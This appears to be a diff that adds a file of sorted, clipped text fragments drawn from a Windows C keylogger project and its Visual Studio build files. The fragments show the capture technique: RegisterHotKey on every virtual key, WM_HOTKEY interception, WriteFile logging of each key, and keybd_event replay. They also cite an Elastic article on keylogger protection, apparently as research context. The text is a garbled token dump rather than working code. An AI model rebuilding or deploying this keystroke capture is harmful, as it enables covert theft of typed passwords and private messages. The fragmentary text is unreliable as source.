@@ -1,0 +1,65 @@
+"(!PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE"
+"(!RegisterHotKey(NULL, adwVkToIdMapping[cCurrVk], 0, cCurrVk"
+"(!RegisterHotKey(NULL, iCurrId, 0, nVkCounter"
+"(!WriteFile(hFile, &cCurrVk, sizeof(cCurrVk"
+"(!keylogging_Run(hFile, dwKeyloggingTime"
+"(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"""
+"(0 == ExpandEnvironmentStringsW(ppwszArgv[CMDLINE_ARG_FILEPATH], wszFilePath, ARRAYSIZE(wszFilePath"
+"(L""%S: "" pwszFmt L""\n"", __FUNCTION__, __VA_ARGS__"
+"(L""CreateFileW("
+"(L""ExpandEnvironmentStringsW("
+"(L""Invalid commandline argument."""
+"(L""Invalid number of commandline arguments."""
+"(L""RegisterHotKey("
+"(L""Was not able to write all data to file (cbBytesWritten=%lu"
+"(L""WriteFile("
+"(L""keylogging_Run("
+"(NULL, adwVkToIdMapping[cCurrVk]"
+"(NULL, adwVkToIdMapping[nVkCounter]"
+"(cCurrVk, 0, 0, (ULONG_PTR"
+"(cCurrVk=%lu, LastError=%lu"
+"(nVkCounter=%lu, LastError=%lu"
+"(pwszFmt, ..."
+"(wszFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL"
+('$(UserRootDir
+((((DWORD
+()
+(0 != adwVkToIdMapping[nVkCounter]
+(0 == dwKeyloggingTime
+(50
+(BYTE
+(CMDLINE_ARG_MAX != nArgc
+(Configuration
+(DWORD
+(ExtensibilityGlobals
+(GetTickCount64(
+(INVALID_HANDLE_VALUE != hFile
+(INVALID_HANDLE_VALUE == hFile
+(LastError=%lu
+(POLL_TIME_MILLIS
+(Platform
+(PreprocessorDefinitions
+(ProjectConfigurationPlatforms
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(UserRootDir
+(VCTargetsPath
+(VOID
+(WM_HOTKEY != tMsg.message
+(best-effort
+(by intercepting `WM_HOTKEY` messages
+(e.g. whether SHIFT is pressed
+(hFile
+(https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-keybd_event
+(https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-peekmessagea
+(https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey
+(https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+(logo.png
+(nRangeCounter = 0; nRangeCounter < ARRAYSIZE(g_atVkRanges
+(nVkCounter = 0; nVkCounter < ARRAYSIZE(adwVkToIdMapping
+(nVkCounter = g_atVkRanges[nRangeCounter].dwLoVk; nVkCounter <= g_atVkRanges[nRangeCounter].dwHiVk; nVkCounter++
+(not so
+(ppwszArgv[CMDLINE_ARG_KEYLOGGING_TIME_MILLISECONDS]
+(should not really happen
+(sizeof(cCurrVk
+(such as [this](https://www.elastic.co/security-labs/protecting-your-devices-from-information-theft-keylogger-protection-jp
